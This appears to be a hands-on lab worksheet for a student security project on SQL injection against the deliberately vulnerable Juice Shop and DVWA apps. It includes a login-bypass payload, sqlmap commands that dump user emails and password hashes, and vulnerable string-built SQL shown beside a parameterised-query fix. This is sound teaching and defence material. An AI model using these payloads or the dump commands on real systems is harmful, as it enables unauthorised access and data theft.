# Session 02 — The Web Attack: SQL Injection → Fix

Your second hands-on session. You'll break into a real (deliberately vulnerable)
web app the way attackers actually do — through the login form and the search box
— then show the one-line coding change that stops it. Rehearse on your laptop
today; on lab day you change **one IP** and run the exact same commands against
Pi #1. About **60–90 minutes**.

> Same rule as the whole project: own the target, isolate the network, show the
> fix. Juice Shop and DVWA are *built to be attacked* — only ever run them on
> your own machine or the isolated lab segment.

---

## Before you start

You need the attacker tools and a target.

- **Tools:** `nmap`, `sqlmap`, a browser, and (optional but recommended) **Burp
  Suite**. On Kali they're pre-installed. Check with:
  ```bash
  ./preflight.sh --tools-only
  ```
- **Target:** OWASP Juice Shop.
  - *Rehearsing on the laptop:* start it in Docker — see `practice-on-windows.md`
    (`docker run -d -p 3000:3000 --name juice bkimminich/juice-shop`), target
    `localhost`.
  - *On lab day:* it's already running on **Pi #1** (`setup-target.sh web` put
    Juice Shop on `:3000` and DVWA on `:80`). Target `192.168.50.11`.

Throughout this doc, set the target once so you can paste the rest:
```bash
TARGET=localhost          # laptop rehearsal
# TARGET=192.168.50.11    # lab day (Pi #1)
```

---

## Part 1 — Recon (confirm the doors)

```bash
nmap -sV -p 80,3000 "$TARGET"
```
✅ **Expected:** `3000/tcp open` (Juice Shop) and `80/tcp open` (DVWA).
📝 **Record:** the output. "The web app announces itself and its version."

No nmap? Confirm with curl:
```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET:3000/"   # 200 = up
```

---

## Part 2 — Login bypass (SQL injection by hand)

The classic. The login form builds a SQL query by gluing your input straight into
a string, so you can rewrite the query's logic.

1. Open `http://$TARGET:3000` → **Account → Login**.
2. In the **Email** field type exactly:
   ```
   ' OR 1=1--
   ```
   Put anything in the password field.
3. Submit.

✅ **Expected:** you're logged in as the first user in the database (the admin),
without knowing any password. The query became
`SELECT * FROM Users WHERE email='' OR 1=1--' AND password='...'` — the `OR 1=1`
is always true and the `--` comments out the password check.
📝 **Record:** a screenshot of the logged-in admin banner. This is
**OWASP Web #3 — Injection**, the number-one cause of real breaches for years.

> On DVWA (`http://$TARGET:80`, login `admin`/`password`, set **Security = low**)
> you can do the graded version: the "SQL Injection" page, input `1' OR '1'='1`,
> then raise the difficulty and watch the same input stop working — a preview of
> the fix.

---

## Part 3 — Data exfiltration (automate with sqlmap)

Hand injection proves the flaw; `sqlmap` shows the *impact* — pulling the whole
database out through the product-search endpoint.

```bash
# 1. Confirm the parameter is injectable
sqlmap -u "http://$TARGET:3000/rest/products/search?q=test" --batch

# 2. List databases, then dump the users table
sqlmap -u "http://$TARGET:3000/rest/products/search?q=test" --batch --dbs
sqlmap -u "http://$TARGET:3000/rest/products/search?q=test" --batch \
       -D SQLite_masterdb --dump
```
✅ **Expected:** sqlmap reports the `q` parameter as injectable and dumps table
contents — including user emails and password hashes.
📝 **Record:** the "parameter is injectable" line and a (redacted) snippet of the
dumped table. This is the difference between "a bug" and "a breach": full data
disclosure.

> Capture-and-replay tie-in: proxy the browser through **Burp Suite**, find the
> `/rest/products/search` request, send it to Repeater, and edit `q` by hand.
> Same attack, seen at the packet level — good for the write-up screenshots.

---

## Part 4 — Defend (close the hole, prove it)

The root cause is **string-built SQL**. The fix is **parameterised queries**
(a.k.a. prepared statements): the database treats your input as *data*, never as
*query syntax*, so `' OR 1=1--` becomes a literal (failed) search string.

**Vulnerable (what the app is doing):**
```js
// input is concatenated straight into the query — attacker controls the logic
db.raw("SELECT * FROM Users WHERE email='" + email + "' AND password='" + pw + "'")
```
**Fixed (parameterised — input can never change the query):**
```js
// '?' placeholders are bound as values; quotes/dashes lose their power
db.raw("SELECT * FROM Users WHERE email=? AND password=?", [email, pw])
```

**Prove it:** on the fixed version (or DVWA at **Security = high**), repeat Part 2
and Part 3.
✅ **Expected:** `' OR 1=1--` is rejected — you stay logged out — and sqlmap
reports the parameter is **not** injectable.
📝 **Record:** the failed login *after* the fix, next to the successful one from
Part 2. That before/after pair is the marks.

---

## What you just demonstrated

| Step | Weakness (OWASP) | Fix you proved |
| --- | --- | --- |
| Recon | Exposed web app / version disclosure | Expose only what's needed; keep software patched |
| Login bypass | Injection — auth logic built from strings | Parameterised queries; never trust input |
| Data dump | Injection — full data disclosure | Parameterised queries + least-privilege DB account |
| Defend | — | Input treated as data, proven with a failed re-attack |

A finding without a fix is half a finding.

## If something doesn't work

- `sqlmap: command not found` → `sudo apt install sqlmap`, or run it from Kali.
- Juice Shop page won't load → give the container ~30s to boot; check
  `docker ps` shows `juice` up; confirm the port with the curl line in Part 1.
- `' OR 1=1--` doesn't log you in → make sure there's a space after `--`
  (some parsers need `-- ` with a trailing space); confirm you're on the Login,
  not Register, form.
- On lab day the target is unreachable → run `./preflight.sh` and fix any
  `[FAIL]` for `192.168.50.11:3000` before continuing.

## Write it up

For each part: what you did, the exact command/input, the result (screenshot),
the impact, and the fix. Drop these straight into the report's "Web attack"
section.

## Next session

- **Session 03:** the AI-era demos — prompt injection and the adversarial patch
  (`docs/session-03.md`).
